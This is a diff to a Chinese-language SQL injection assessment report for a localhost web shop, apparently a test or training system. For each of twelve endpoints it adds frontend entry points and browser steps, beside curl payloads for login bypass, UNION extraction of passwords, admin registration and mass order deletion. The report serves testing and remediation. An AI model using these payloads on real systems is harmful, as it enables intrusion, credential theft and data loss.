@@ -21,6 +21,7 @@
 - **端点**: `GET /api/news/:id`
 - **参数**: `id` (路径参数)
 - **文件**: `backend/server.js`
+- **前端入口**: 新闻列表页面点击标题 → 新闻详情
 
 ### 漏洞描述
 新闻详情查询功能未对ID参数进行验证和参数化处理，直接将用户输入拼接到SQL查询中。
@@ -43,6 +44,11 @@ curl "http://localhost:3001/api/news/1 OR 1=1--"
 curl "http://localhost:3001/api/news/999 UNION SELECT id,username,password,email,role,created_at,NULL,NULL FROM users_db--"
 ```
 
+### 前端测试
+1. 访问 http://localhost:3000/news
+2. 点击任意新闻标题
+3. 在浏览器地址栏将URL改为 `http://localhost:3000/news/1 OR 1=1--`
+
 ### 影响
 - 可以查询任意新闻记录
 - 可以通过UNION注入查询其他表的敏感数据
@@ -56,6 +62,7 @@ curl "http://localhost:3001/api/news/999 UNION SELECT id,username,password,email
 - **端点**: `GET /api/news/category/:category`
 - **参数**: `category` (路径参数)
 - **文件**: `backend/server.js`
+- **前端入口**: 新闻页面 → 分类筛选下拉框
 
 ### 漏洞描述
 分类筛选功能未对分类名称进行过滤，攻击者可以通过闭合单引号注入SQL代码。
@@ -78,6 +85,11 @@ curl "http://localhost:3001/api/news/category/' OR '1'='1"
 curl "http://localhost:3001/api/news/category/test' UNION SELECT id,username,password,email,role,NULL FROM users_db--"
 ```
 
+### 前端测试
+1. 访问 http://localhost:3000/news
+2. 在分类筛选下拉框中选择任意分类
+3. 使用浏览器开发者工具修改请求，将分类参数改为 `' OR '1'='1`
+
 ### 影响
 - 可以绕过分类限制查看所有新闻
 - 可以通过UNION查询敏感数据
@@ -90,6 +102,7 @@ curl "http://localhost:3001/api/news/category/test' UNION SELECT id,username,pas
 - **端点**: `GET /api/products/:id`
 - **参数**: `id` (路径参数)
 - **文件**: `backend/server.js`
+- **前端入口**: 商城页面 → 点击产品卡片 → 查看详情
 
 ### 漏洞描述
 产品详情查询不仅存在SQL注入，而且错误信息直接返回给客户端，暴露数据库结构。
@@ -111,6 +124,12 @@ curl "http://localhost:3001/api/products/1 UNION SELECT * FROM users_db"
 curl "http://localhost:3001/api/products/999 UNION SELECT id,username,password,email,role,created_at FROM users_db"
 ```
 
+### 前端测试
+1. 访问 http://localhost:3000/shop
+2. 点击"产品商城"
+3. 点击任意产品的"查看详情"
+4. 在产品详情弹窗中，可以看到产品ID，手动构造API请求进行测试
+
 ### 影响
 - 通过错误信息泄露数据库结构
 - 可以提取任意表的数据
@@ -123,6 +142,7 @@ curl "http://localhost:3001/api/products/999 UNION SELECT id,username,password,e
 - **端点**: `GET /api/products/search`
 - **参数**: `q`, `category` (查询参数)
 - **文件**: `backend/server.js`
+- **前端入口**: 商城页面 → 产品商城 → 搜索框
 
 ### 漏洞描述
 搜索功能使用LIKE查询，但未对关键词进行过滤，可以注入UNION语句。
@@ -143,6 +163,11 @@ curl "http://localhost:3001/api/products/search?q=' UNION SELECT 1,name,sql,4,5,
 curl "http://localhost:3001/api/products/search?q=' UNION SELECT id,username,password,email,role,created_at FROM users_db--"
 ```
 
+### 前端测试
+1. 访问 http://localhost:3000/shop → 产品商城
+2. 在搜索框中输入: `' UNION SELECT id,username,password,email FROM users_db--`
+3. 点击搜索按钮
+
 ### 影响
 - 可以查询数据库所有表
 - 可以提取任意敏感数据
@@ -155,6 +180,7 @@ curl "http://localhost:3001/api/products/search?q=' UNION SELECT id,username,pas
 - **端点**: `PUT /api/products/:id/stock`
 - **参数**: `id` (路径), `quantity` (body)
 - **文件**: `backend/server.js`
+- **前端入口**: 商城页面 → 产品详情 → 库存管理
 
 ### 漏洞描述
 库存更新功能的ID和数量参数都未经过滤，攻击者可以修改任意产品的任意字段。
@@ -177,6 +203,12 @@ curl -X PUT "http://localhost:3001/api/products/1 OR 1=1--/stock" \
   -d '{"quantity":0}'
 ```
 
+### 前端测试
+1. 访问 http://localhost:3000/shop → 产品商城
+2. 点击任意产品的"查看详情"
+3. 在库存管理区域，输入 `999, price=0.01 WHERE id=1--`
+4. 点击"更新库存"
+
 ### 影响
 - 可以修改任意产品的任意字段
 - 可以批量修改数据库记录
@@ -189,6 +221,7 @@ curl -X PUT "http://localhost:3001/api/products/1 OR 1=1--/stock" \
 - **端点**: `POST /api/auth/login`
 - **参数**: `username`, `password` (JSON body)
 - **文件**: `backend/server.js`
+- **前端入口**: 导航栏 → 登录 → 登录表单
 
 ### 漏洞描述
 登录功能未使用参数化查询，直接拼接用户输入，可以通过Boolean盲注绕过身份验证。
@@ -216,6 +249,12 @@ curl -X POST http://localhost:3001/api/auth/login \
   -d '{"username":"admin'\'' AND substr(password,1,1)='\''a'\''--","password":"x"}'
 ```
 
+### 前端测试
+1. 访问 http://localhost:3000/login
+2. 在用户名框输入: `admin'--`
+3. 密码随意输入
+4. 点击登录，将成功绕过验证
+
 ### 影响
 - 可以绕过身份验证
 - 可以以任意用户身份登录
@@ -229,6 +268,7 @@ curl -X POST http://localhost:3001/api/auth/login \
 - **端点**: `POST /api/auth/register`
 - **参数**: `username`, `password`, `email` (JSON body)
 - **文件**: `backend/server.js`
+- **前端入口**: 导航栏 → 登录 → 切换到注册
 
 ### 漏洞描述
 用户注册功能的INSERT语句直接拼接用户输入，攻击者可以插入恶意数据或提升权限。
@@ -247,6 +287,14 @@ curl -X POST http://localhost:3001/api/auth/register \
   -d '{"username":"hacker","password":"pass","email":"test@test.com'\'', '\''admin'\'')}--"}'
 ```
 
+### 前端测试
+1. 访问 http://localhost:3000/login
+2. 切换到"注册"标签
+3. 用户名: hacker
+4. 密码: pass123
+5. 邮箱: `test@test.com', 'admin')}--`
+6. 点击注册，将注册为admin权限用户
+
 ### 影响
 - 可以注册具有admin权限的账户
 - 可以绕过字段限制
@@ -259,6 +307,7 @@ curl -X POST http://localhost:3001/api/auth/register \
 - **端点**: `GET /api/auth/check-username/:username`
 - **参数**: `username` (路径参数)
 - **文件**: `backend/server.js`
+- **前端入口**: 注册页面 → 用户名检查工具
 
 ### 漏洞描述
 用户名可用性检查功能可以被用于执行Time-based盲注攻击。
@@ -277,6 +326,13 @@ curl "http://localhost:3001/api/auth/check-username/admin' AND (SELECT substr(pa
 curl "http://localhost:3001/api/auth/check-username/admin' AND (SELECT length(password) FROM users_db WHERE username='admin')>5--"
 ```
 
+### 前端测试
+1. 访问 http://localhost:3000/login
+2. 切换到"注册"标签
+3. 滚动到底部找到"检查用户名是否可用"
+4. 输入: `admin' AND (SELECT substr(password,1,1) FROM users_db WHERE username='admin')='a'--`
+5. 点击"检查"，通过响应判断真假
+
 ### 影响
 - 可以通过响应差异推断数据库内容
 - 可以逐字符提取敏感数据
@@ -289,6 +345,7 @@ curl "http://localhost:3001/api/auth/check-username/admin' AND (SELECT length(pa
 - **端点**: `GET /api/orders/user/:userId`
 - **参数**: `userId` (路径参数)
 - **文件**: `backend/server.js`
+- **前端入口**: 商城中心 → 订单管理 → 按用户查询
 
 ### 漏洞描述
 用户订单查询使用多表JOIN，但用户ID参数未经过滤。
@@ -311,6 +368,11 @@ curl "http://localhost:3001/api/orders/user/1 OR 1=1--"
 curl "http://localhost:3001/api/orders/user/999 UNION SELECT id,username,password,email,role,created_at,NULL,NULL FROM users_db--"
 ```
 
+### 前端测试
+1. 访问 http://localhost:3000/shop → 订单管理
+2. 在"按用户查询"框中输入: `1 OR 1=1--`
+3. 点击"查询用户订单"
+
 ### 影响
 - 可以查看所有用户的订单
 - 可以通过UNION查询其他表
@@ -323,6 +385,7 @@ curl "http://localhost:3001/api/orders/user/999 UNION SELECT id,username,passwor
 - **端点**: `GET /api/orders`
 - **参数**: `sort`, `order`, `status` (查询参数)
 - **文件**: `backend/server.js`
+- **前端入口**: 商城中心 → 订单管理 → 排序下拉框
 
 ### 漏洞描述
 订单列表的排序字段未经验证，可以注入子查询或CASE表达式。
@@ -341,6 +404,12 @@ curl "http://localhost:3001/api/orders?sort=(SELECT COUNT(*) FROM users_db)&orde
 curl "http://localhost:3001/api/orders?sort=(SELECT CASE WHEN (SELECT substr(password,1,1) FROM users_db WHERE username='admin')='a' THEN id ELSE total_price END)&order=ASC"
 ```
 
+### 前端测试
+1. 访问 http://localhost:3000/shop → 订单管理
+2. 使用浏览器开发者工具查看网络请求
+3. 修改sort参数为: `(SELECT COUNT(*) FROM users_db)`
+4. 观察结果
+
 ### 影响
 - 可以通过子查询提取数据
 - 可以进行盲注攻击
@@ -353,6 +422,7 @@ curl "http://localhost:3001/api/orders?sort=(SELECT CASE WHEN (SELECT substr(pas
 - **端点**: `DELETE /api/orders/:id`
 - **参数**: `id` (路径参数)
 - **文件**: `backend/server.js`
+- **前端入口**: 商城中心 → 订单管理 → 删除按钮
 
 ### 漏洞描述
 订单删除功能未对ID参数进行验证，可以批量删除记录。
@@ -371,6 +441,12 @@ curl -X DELETE "http://localhost:3001/api/orders/1 OR 1=1--"
 curl -X DELETE "http://localhost:3001/api/orders/1 OR status='pending'--"
 ```
 
+### 前端测试
+1. 访问 http://localhost:3000/shop → 订单管理
+2. 使用浏览器开发者工具拦截删除请求
+3. 修改订单ID为: `1 OR 1=1--`
+4. 将删除所有订单
+
 ### 影响
 - 可以删除任意订单记录
 - 可以批量删除数据
@@ -383,6 +459,7 @@ curl -X DELETE "http://localhost:3001/api/orders/1 OR status='pending'--"
 - **端点**: `GET /api/users/search`
 - **参数**: `q`, `role` (查询参数)
 - **文件**: `backend/server.js`
+- **前端入口**: 管理后台 → 用户管理 → 搜索框
 
 ### 漏洞描述
 用户搜索功能使用LIKE查询，但未对搜索关键词进行过滤。
@@ -402,6 +479,11 @@ curl "http://localhost:3001/api/users/search?q=%25' OR '1'='1"
 # UNION查询产品表
 curl "http://localhost:3001/api/users/search?q=%25' UNION SELECT id,name,description,price FROM products--"
 ```
+
+### 前端测试
+1. 访问 http://localhost:3000/admin → 用户管理
+2. 在搜索框中输入: `%' OR '1'='1`
+3. 点击搜索，将返回所有用户
 
 ### 影响
 - 可以绕过搜索限制
@@ -568,6 +650,12 @@ curl "http://localhost:3001/api/products/search?q=' UNION SELECT id,username,pas
 
 本系统中发现的12个SQL注入漏洞分布在核心业务功能中，包括用户认证、产品管理、订单处理等。这些漏洞的存在使得攻击者可以完全控制数据库，获取所有敏感数据，甚至破坏系统数据完整性。
 
+**所有漏洞都可以通过前端界面被发现和利用**，测试人员可以：
+1. 通过正常浏览网站发现功能入口
+2. 使用浏览器开发者工具查看和修改HTTP请求
+3. 手动构造恶意payload进行测试
+4. 使用自动化工具（如SQLMap）进行扫描
+
 **建议立即采取以下措施**:
 1. 立即修复所有SQL注入漏洞
 2. 实施代码审查流程
@@ -580,4 +668,5 @@ curl "http://localhost:3001/api/products/search?q=' UNION SELECT id,username,pas
 **报告生成日期**: 2025-11-25  
 **报告类型**: 安全漏洞分析  
 **测试范围**: 全系统API端点  
-**测试方法**: 手动测试 + 自动化扫描
+**测试方法**: 手动测试 + 自动化扫描  
+**前端可见性**: ✅ 所有漏洞都有前端入口
